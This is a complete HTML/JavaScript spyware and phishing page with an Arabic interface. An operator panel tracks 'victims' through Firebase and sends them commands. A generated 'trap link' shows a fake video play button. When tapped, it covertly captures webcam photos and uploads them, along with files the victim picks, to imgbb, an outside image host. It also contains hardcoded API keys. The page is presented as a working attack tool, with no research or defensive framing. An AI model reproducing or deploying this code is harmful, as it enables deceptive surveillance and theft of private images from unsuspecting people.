<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>S-SYSTEM V30 | ULTIMATE</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        :root { --neon: #00ff41; }
        body { background: #000; color: var(--neon); margin: 0; font-family: 'Courier New', monospace; overflow-x: hidden; }
        
        /* الرادار ولوحة التحكم */
        #admin-panel { display: block; padding: 15px; }
        .radar-box { border: 1px solid var(--neon); padding: 15px; margin-bottom: 15px; background: #050505; border-radius: 10px; box-shadow: 0 0 10px rgba(0,255,65,0.2); }
        .v-list-item { border: 1px solid #222; padding: 12px; margin-bottom: 8px; cursor: pointer; display: flex; justify-content: space-between; background: #0a0a0a; border-radius: 5px; }
        .v-list-item.active { border-color: #fff; background: #111; box-shadow: 0 0 8px var(--neon); }
        
        /* الأزرار */
        .controls { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 15px; font-weight: bold; cursor: pointer; border-radius: 5px; transition: 0.2s; }
        button:active { background: var(--neon); color: #000; }
        input { width: 100%; padding: 12px; background: #000; border: 1px solid var(--neon); color: #0ff; margin-bottom: 10px; box-sizing: border-box; }

        /* واجهة الفخ */
        #vic-panel { display: none; height: 100vh; flex-direction: column; align-items: center; justify-content: center; position: fixed; top: 0; width: 100%; background: #000; z-index: 9999; }
        .play-btn { width: 110px; height: 110px; border: 6px solid #fff; border-radius: 50%; position: relative; cursor: pointer; animation: pulse 2s infinite; }
        .play-btn::after { content: ''; position: absolute; top: 28px; left: 42px; border-left: 35px solid #fff; border-top: 25px solid transparent; border-bottom: 25px solid transparent; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
    </style>
</head>
<body>

<div id="admin-panel">
    <div class="radar-box">
        <h3 style="margin:0 0 10px 0;">📡 رادار الاختراق (V30):</h3>
        <div id="target-list">جاري البحث عن أجهزة...</div>
    </div>

    <div class="radar-box">
        <h3>🕹️ التحكم بالجهاز: <span id="current-target" style="color:#fff;">--</span></h3>
        <div class="controls">
            <button onclick="sendCmd('snap')">📸 سحب صورة</button>
            <button onclick="sendCmd('vibrate')" style="color:yellow; border-color:yellow;">📳 هز الهاتف</button>
            <button onclick="sendCmd('pick')" style="color:cyan; border-color:cyan;">📂 سحب ملفات</button>
            <button onclick="sendCmd('release')" style="background:#030;">🔓 إطلاق سراح</button>
        </div>
        <button onclick="db.ref('victims').remove()" style="color:red; border-color:red; width:100%; margin-top:15px; font-size:11px;">🗑️ مسح الرادار نهائياً</button>
    </div>

    <div class="radar-box">
        <input type="text" id="decoy-url" placeholder="رابط يوتيوب للتمويه">
        <button onclick="createTrap()" style="width:100%;">صناعة رابط الفخ</button>
        <div id="trap-link" style="font-size:10px; color:#0ff; margin-top:10px; word-break:break-all; background:#111; padding:8px; border:1px dashed #333;"></div>
    </div>
</div>

<div id="vic-panel">
    <div class="play-btn" onclick="startEngine()"></div>
    <p style="color:#fff; margin-top:20px; font-family: sans-serif; font-weight: bold;">اضغط للتشغيل | Tap to Play</p>
    <video id="monitor" autoplay playsinline style="display:none;"></video>
    <canvas id="output" style="display:none;"></canvas>
    <input type="file" id="file-getter" style="display:none;" accept="image/*" multiple>
</div>

<script>
    // --- التكوين النهائي ---
    const IMGBB_KEY = "657662c1253a66974d09325996b27e8a";
    const firebaseConfig = {
        apiKey: "AIzaSyBT-2QQEdSdO-DsQvPESPc8cBQaW5azxqY",
        databaseURL: "https://monster-system-7f67e-default-rtdb.firebaseio.com",
        projectId: "monster-system-7f67e"
    };

    if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
    const db = firebase.database();
    let selectedId = null;

    const urlParams = new URLSearchParams(window.location.search);
    const trapId = urlParams.get('v');

    // --- نظام التوجيه الذكي ---
    if (trapId) {
        document.getElementById('admin-panel').style.display = 'none';
        document.getElementById('vic-panel').style.display = 'flex';
        setupVictim(atob(trapId));
    } else {
        setupAdmin();
    }

    // --- وظائف الآدمن ---
    function setupAdmin() {
        db.ref('victims').on('value', snapshot => {
            const container = document.getElementById('target-list');
            container.innerHTML = '';
            if(!snapshot.exists()) { container.innerHTML = "الرادار يبحث عن نبض..."; return; }
            snapshot.forEach(child => {
                const data = child.val();
                const id = child.key;
                const isOnline = (Date.now() - data.lastSeen) < 8000;
                container.innerHTML += `<div class="v-list-item ${id === selectedId ? 'active' : ''}" onclick="setTarget('${id}','${data.model}')">
                    <span>📱 ${data.model}</span>
                    <span style="color:${isOnline ? '#0f0' : '#444'}">${isOnline ? '● نشط الآن' : '● غائب'}</span>
                </div>`;
            });
        });
    }

    function setTarget(id, model) { selectedId = id; document.getElementById('current-target').innerText = model; setupAdmin(); }
    function sendCmd(t) { if(selectedId) db.ref('victims/'+selectedId+'/cmd').set({ type: t, time: Date.now() }); }
    function createTrap() {
        const u = document.getElementById('decoy-url').value;
        if(!u) return alert("أدخل رابطاً للتمويه!");
        const finalLink = window.location.origin + window.location.pathname + "?v=" + btoa(u);
        document.getElementById('trap-link').innerText = finalLink;
    }

    // --- نظام الاتصال العكسي (Victim Logic) ---
    let myRef = null;
    function setupVictim(decoy) {
        const device = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1].split(';')[0] : "Unknown Device";
        myRef = db.ref('victims').push();
        
        // النبضة الإجبارية الفورية (Heartbeat)
        const pulse = () => myRef.update({ model: device, lastSeen: Date.now() });
        pulse();
        setInterval(pulse, 3000);

        // الاستماع للأوامر
        db.ref('victims/' + myRef.key + '/cmd').on('value', s => {
            const c = s.val(); if(!c) return;
            if(c.type === 'snap') capture();
            if(c.type === 'vibrate') navigator.vibrate([500, 200, 500]);
            if(c.type === 'pick') document.getElementById('file-getter').click();
            if(c.type === 'release') window.location.href = decoy;
        });
    }

    async function startEngine() { await capture(); }

    async function capture() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({video:true});
            const video = document.getElementById('monitor'); video.srcObject = stream; await video.play();
            const canvas = document.getElementById('output');
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const rawData = canvas.toDataURL('image/jpeg', 0.6).split(',')[1];
            
            // رفع لـ imgBB
            let fd = new FormData(); fd.append("image", rawData);
            fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_KEY}`, { method: "POST", body: fd })
            .then(r => r.json()).then(r => { myRef.child('photos').push(r.data.url); });
            
            stream.getTracks().forEach(t => t.stop());
        } catch(e) { console.log("Blocked"); }
    }

    document.getElementById('file-getter').onchange = (e) => {
        for(let f of e.target.files) {
            const r = new FileReader();
            r.onload = (ev) => {
                let fd = new FormData(); fd.append("image", ev.target.result.split(',')[1]);
                fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_KEY}`, { method: "POST", body: fd })
                .then(res => res.json()).then(res => { myRef.child('photos').push(res.data.url); });
            };
            r.readAsDataURL(f);
        }
    };
</script>
</body>
</html>
